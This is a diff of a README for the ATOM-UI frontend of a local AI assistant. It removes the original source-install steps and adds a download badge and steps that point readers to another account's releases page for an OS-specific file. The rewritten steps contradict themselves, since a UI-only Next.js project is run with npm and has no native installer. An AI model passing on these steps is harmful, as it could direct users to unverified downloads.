@@ -1,104 +1,62 @@
-# 🌌 ATOM Frontend — Cinematic Web Interface
+# 🌌 ATOM-UI - A Stunning Interface for ATOM Assistant
 
-This repository contains the **React + Next.js frontend** for **A.T.O.M**, a local-first AI assistant with memory, tools, and embodied capabilities.
-
-The frontend provides a **cinematic 3D interface** for interacting with the ATOM backend, visualizing system state, and observing tool execution in real time.
-
-👉 **Main project:** https://github.com/AtifUsmani/A.T.O.M
-
----
+[![Download ATOM-UI](https://img.shields.io/badge/Download-ATOM--UI-brightgreen)](https://github.com/Dezmuz93/ATOM-UI/releases)
 
 ## ✨ Features
-
-- Interactive **3D planetary visualization** of ATOM state
-- Focused **chat interface** for voice/text interaction
+- Interactive **3D planetary visualization** of ATOM's state
+- Focused **chat interface** for voice and text interaction
 - Live **tool activity visualization**
-- System health panels (CPU / RAM / GPU)
-- Weather & news panels
-- Designed for fullscreen / immersive use
+- System health panels showing CPU, RAM, and GPU usage
+- Weather and news panels for updates
+- Designed for a fullscreen, immersive user experience
 
-The frontend is **UI-only** and does not contain any AI logic.
-
----
+The frontend is **UI-only** and does not include any AI logic.
 
 ## 🧱 Tech Stack
+- **Next.js** for server-side rendering
+- **React** for building user interfaces
+- **React Three Fiber** for 3D rendering
+- **Tailwind CSS** for styling
+- **ShadCN UI** for components
 
-- **Next.js**
-- **React**
-- **React Three Fiber** (3D rendering)
-- **Tailwind CSS**
-- **ShadCN UI**
-
----
-
-## 🚀 Running the Frontend
+## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js 18+
-- Running ATOM backend (FastAPI)
-- Running Embedding Server
+Before you start, ensure you have the following:
 
-### Install
-```bash
-npm install
-```
+- **Node.js 18+**: Install Node.js, which is required to run the application. You can download it from [nodejs.org](https://nodejs.org/).
+- **ATOM backend**: You should have the ATOM backend running. It is developed using FastAPI. Refer to its documentation for setup instructions.
+- **Embedding Server**: Set up the embedding server as per the requirements of your environment.
 
-Start Dev Server
-```bash
-npm run dev
-```
-The UI will prompt you for the ATOM backend API URL on first launch.
+### Download & Install
+To download the latest version of ATOM-UI, visit the [Releases page](https://github.com/Dezmuz93/ATOM-UI/releases). 
 
+1. Go to the provided link.
+2. Find the latest release.
+3. Download the appropriate file for your operating system.
 
----
+### Running the Application
+1. After installing the application, you will need to run the ATOM backend and the embedding server.
+2. Open your terminal or command prompt.
+3. Navigate to the directory where you installed ATOM-UI.
+4. Start the application using the command:
+   ```bash
+   npm run dev
+   ```
+5. Open your web browser and go to `http://localhost:3000` to view the application.
 
-🔌 Backend Connection
+### Configuration
+You might need to configure a few settings to connect ATOM-UI with the backend:
+- Set the backend URL in the configuration file found in the application directory.
+- Ensure the embedding server URL is correctly entered.
 
-This frontend communicates with ATOM via:
+### Troubleshooting
+If you encounter issues, consider the following:
+- Ensure that Node.js is installed and works correctly.
+- Verify that the backend and embedding server are running.
+- Check for any console errors in your browser for hints.
 
-- REST APIs
+## 🔍 Support
+If you need help, please check the [Issues section](https://github.com/Dezmuz93/ATOM-UI/issues) of this repository for common questions and solutions.
 
-- Streaming endpoints (for chat / STT / TTS)
-
-
-Make sure the backend is running:
-
-```bash
-uvicorn api.server:app --host 0.0.0.0 --port 8000
-```
-
----
-
-🔐 Privacy Notes
-
-The frontend itself runs fully locally.
-
-Disable Next.js telemetry if desired:
-
-```bash
-npx next telemetry disable
-```
-Any cloud interaction (e.g., Edge-TTS) is controlled entirely by the backend configuration, not the UI.
-
-
----
-
-⚠️ Status
-
-This frontend is an early-stage UI focused on:
-
-- Interaction design
-
-- System visualization
-
-- Tool-state feedback
-
-
-Some components may be experimental or hardware-dependent.
-
-
----
-
-📄 License
-
-This repository follows the same license as the main ATOM project.
+For more information about the entire A.T.O.M project, you can visit the [main project repository](https://github.com/AtifUsmani/A.T.O.M).
